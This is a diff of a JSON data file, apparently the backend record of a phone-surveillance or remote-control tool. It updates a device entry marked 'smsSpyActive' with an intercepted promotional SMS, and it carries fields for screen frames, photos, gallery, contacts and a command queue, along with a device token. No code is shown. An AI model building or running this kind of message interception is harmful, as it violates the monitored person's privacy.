@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776737552382,
+    "lastSeen": 1776737579473,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3046,7 +3046,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "SMS",
+        "sender": "3Kejutan",
+        "content": "INTERNETAN pake TRI! HEMAT Bikin HAPPY!\n\n- 7GB 2hr 10rb\n- 10GB 28hr 40rb\n\nKlik https://bima-3.co/CPstM Sekarang!",
+        "time": "21/04 09:12",
+        "pkg": "com.android.mms",
+        "receivedAt": 1776737580126
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
